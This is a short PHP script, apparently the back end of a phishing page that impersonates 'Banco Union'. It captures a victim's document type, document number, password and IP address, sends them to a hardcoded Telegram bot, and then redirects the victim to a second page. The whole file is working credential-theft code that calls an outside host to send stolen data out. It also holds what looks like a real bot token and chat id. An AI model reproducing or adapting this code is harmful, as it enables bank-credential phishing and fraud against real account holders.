<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $tipoDocumento = $_POST['typeDocument'];
    $numeroDocumento = $_POST['document'];
    $contrasena = $_POST['password'];
    $ip = $_SERVER['REMOTE_ADDR'];

    // chat id aqui
    $chatId = '1477706572';

    // mensaje
    $message = "BANCO UNION:\n\n"
        . "Tipo de documento: $tipoDocumento\n"
        . "Número de documento: $numeroDocumento\n"
        . "Contraseña: $contrasena\n"
        . "IP: $ip";

    // token y url
    $botToken = '6181884420:AAFtnrzrqxh5T3LJJn2G2PSBI7kY-uly9WY';
    $telegramUrl = 'https://api.telegram.org/bot' . $botToken;

    // Envía al telegram
    file_get_contents($telegramUrl . '/sendMessage?chat_id=' . $chatId . '&text=' . urlencode($message));
}

  header("Location: index2.html");;
    exit;

?>
